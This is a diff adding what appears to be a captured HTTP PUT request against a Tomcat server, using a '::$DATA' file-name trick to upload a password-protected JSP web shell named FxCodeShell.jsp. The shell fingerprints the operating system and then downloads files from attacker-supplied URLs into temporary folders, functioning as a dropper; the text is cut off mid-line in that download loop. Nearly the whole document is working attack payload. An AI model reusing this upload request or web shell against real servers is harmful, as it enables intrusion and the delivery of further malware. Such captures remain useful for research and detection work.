@@ -1,0 +1,71 @@
+1PUT /FxCodeShell.jsp::$DATA HTTP/1.1
+Accept: */*
+Referer: http://63.35.98.93:8060/FxCodeShell.jsp::$DATA
+Accept-Language: zh-cn
+User-Agent: Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)
+Content-Length: 3365
+Host: 63.35.98.93:8060
+Connection: Keep-Alive
+
+<%@ page import="java.util.Arrays"%>
+<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
+<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
+<%
+	String view = request.getParameter("view");
+	if (view == null || view.equals("")) {
+		String localOS = System.getProperty("os.name");
+		List<String> osList;
+		String tomcatOS = "0";
+		String DEFAULT = "0";
+		String WINDOWS = "1";
+		String LINUX = "2";
+		osList = new ArrayList<String>();
+		osList.add("Linux");
+		osList.add("Windows");
+		for (String os : osList) {
+			if (localOS.contains(os)) {
+				if (os.equals("Linux")) {
+					tomcatOS = LINUX;
+				} else if (os.equals("Windows")) {
+					tomcatOS = WINDOWS;
+				} else {
+					tomcatOS = DEFAULT;
+				}
+				break;
+			}
+		}
+		out.write(tomcatOS + "<br/>");
+		response.setHeader("OS", tomcatOS);
+		return;
+	}
+%>
+
+<%
+	String password = "FxxkMyLie1836710Aa";
+	if (!view.equals(password)) {
+		return;
+	}
+	int systemCode = Integer.parseInt(request.getParameter("os"));
+	String address = request.getParameter("address");
+	String fileName = null;
+	String path = null;
+	String winPath = "%SystemRoot%/Temp/";
+	String linuxPath = "/var/tmp/";
+	switch (systemCode) {
+	case 1:
+		path = winPath;
+		break;
+	default:
+		path = linuxPath;
+		break;
+	}
+
+	String[] urls = address.split(",");
+	InputStream fileInputSteam = null;
+	FileOutputStream fileOutputStream = null;
+	for (int i = 0; i <= urls.length - 1; i++) {
+		try {
+			String[] file = urls[i].split("/");
+			fileName = file[file.length - 1];
+			out.write("Download:" + urls[i] + "<br>");
+			out.write("<br
